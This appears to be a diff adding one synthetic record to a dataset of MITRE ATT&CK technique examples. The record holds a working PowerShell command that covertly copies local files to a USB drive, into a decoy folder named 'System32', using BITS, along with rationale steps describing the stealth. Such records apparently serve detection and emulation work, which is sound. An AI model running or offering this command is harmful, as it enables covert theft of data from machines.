@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\System32\" -ItemType Directory -Force | Out-Null; Start-BitsTransfer -Source \"C:\\SourceData\\*\" -Destination \"$dl:\\System32\" -Priority Low",
+  "explanation": "Uses BITS to transfer local files quietly to a system-sounding folder on a USB device, keeping activity local and resilient.",
+  "rationale_steps": [
+    "Resolve the removable drive letter.",
+    "Create a plausible destination folder on the USB.",
+    "Use BITS to copy local files to the removable device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-88b580d5",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
